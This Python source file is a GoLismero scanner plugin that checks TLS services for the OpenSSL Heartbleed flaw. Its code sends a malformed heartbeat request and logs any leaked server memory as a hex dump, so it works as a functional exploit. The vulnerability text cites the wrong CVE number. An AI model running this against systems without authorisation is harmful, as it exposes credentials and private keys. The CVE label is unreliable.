#!/usr/bin/env python
# -*- coding: utf-8 -*-

__license__ = """
GoLismero 2.0 - The web knife - Copyright (C) 2011-2014

Golismero project site: http://golismero-project.com
Golismero project mail: contact@golismero-project.com

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
"""

#------------------------------------------------------------------------------
# Based on original source code by Jared Stafford (jspenguin@jspenguin.org)
# which was released into the public domain.

import select
import socket
import struct
import sys
import time

from golismero.api.data import Relationship
from golismero.api.data.information.fingerprint import ServiceFingerprint
from golismero.api.data.resource.url import BaseURL, URL
from golismero.api.data.resource.ip import IP
from golismero.api.data.vulnerability.infrastructure.vulnerable_service import VulnerableService
from golismero.api.data.vulnerability.infrastructure.vulnerable_webapp import VulnerableWebApp
from golismero.api.logger import Logger
from golismero.api.net import ConnectionSlot
from golismero.api.plugin import TestingPlugin


#------------------------------------------------------------------------------
def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    output = []
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        output.append('  %04x: %-48s %s' % (b, hxdat, pdat))
    output.append('')
    return '\n'.join(output)

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        Logger.log('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        Logger.log('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    Logger.log(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            Logger.log('No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            Logger.log('Received heartbeat response:\n' + hexdump(pay))
            if len(pay) > 3:
                Logger.log('WARNING: server returned more data than it should - server is vulnerable!')
            else:
                Logger.log('Server processed malformed heartbeat, but did not return any extra data.')
            return True

        if typ == 21:
            Logger.log('Received alert:\n' + hexdump(pay))
            Logger.log('Server returned error, likely not vulnerable')
            return False

def main(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Logger.log('Connecting...')
    sys.stdout.flush()
    s.connect((host, port))
    Logger.log('Sending Client Hello...')
    sys.stdout.flush()
    s.send(hello)
    Logger.log('Waiting for Server Hello...')
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            Logger.log('Server closed connection without sending Server Hello.')
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    Logger.log('Sending heartbeat request...')
    sys.stdout.flush()
    s.send(hb)
    return hit_hb(s)


#------------------------------------------------------------------------------
class HeartbleedPlugin(TestingPlugin):
    """
    OpenSSL Heartbleed attack plugin.

    Based on original source code by Jared Stafford (jspenguin@jspenguin.org).
    """


    #--------------------------------------------------------------------------
    def get_accepted_types(self):
        return [BaseURL, Relationship(IP, ServiceFingerprint)]


    #--------------------------------------------------------------------------
    def run(self, info):

        # If it's an URL...
        if info.is_instance(BaseURL):
            target = URL(info.url)

            # Get the hostname to test.
            hostname = info.hostname

            # If it's HTTPS, use the port number from the URL.
            if info.is_https:
                port = info.parsed_url.port

            # Otherwise, assume the port is 443.
            else:
                port = 443

            # Test this port.
            is_vulnerable = self.test(hostname, port)

        # If it's a service fingerprint...
        elif info.is_instance(Relationship(IP, ServiceFingerprint)):
            ip, fp = info.instances
            target = ip
            port = fp.port

            # Ignore if the port does not support SSL.
            if fp.protocol != "SSL":
                Logger.log_more_verbose(
                    "No SSL services found in fingerprint [%s] for IP %s,"
                    " aborting." % (fp, ip))
                return

            # Test this port.
            is_vulnerable = self.test(ip.address, port)

        # Internal error!
        else:
            assert False, "Unexpected data type received: %s" % type(info)

        # If it's vulnerable, report the vulnerability.
        if is_vulnerable:
            title = "OpenSSL Heartbleed Vulnerability"
            description = "An unpatched OpenSSL service was found that's" \
                          " vulnerable to the Heartbleed vulnerability" \
                          " (CVE-2014-0162). This vulnerability allows an" \
                          " attacker to dump the memory contents of the" \
                          " service running the flawed version of the" \
                          " OpenSSL library, potentially compromising" \
                          " usernames, passwords, private keys and other" \
                          " sensitive data."
            references = ["http://heartbleed.com/"]
            cve = ["CVE-2014-0162",],
            if target.is_instance(IP):
                vuln = VulnerableService(
                    target      = target,
                    port        = port,
                    protocol    = "TCP",
                    title       = title,
                    description = description,
                    references  = references,
                    cve         = cve,
                )
            elif target.is_instance(URL):
                vuln = VulnerableWebApp(
                    target      = target,
                    title       = title,
                    description = description,
                    references  = references,
                    cve         = cve,
                )
            else:
                assert False, "Internal error!"
            return vuln


    #--------------------------------------------------------------------------
    def test(self, hostname, port):
        """
        Test against the specified hostname and port.

        :param hostname: Hostname to test.
        :type hostname: str

        :param port: TCP port to test.
        :type port: int

        :returns: True if the host is vulnerable, False otherwise.
        :rtype: bool
        """

        # Don't scan the same host and port twice.
        if self.state.put("%s:%d" % (hostname, port), True):
            Logger.log_more_verbose(
                "Host %s:%d already scanned, skipped."
                % (hostname, port))
            return False

        # Request permission to connect to the host.
        with ConnectionSlot(hostname):

            # Test the host and port.
            return main(hostname, port)
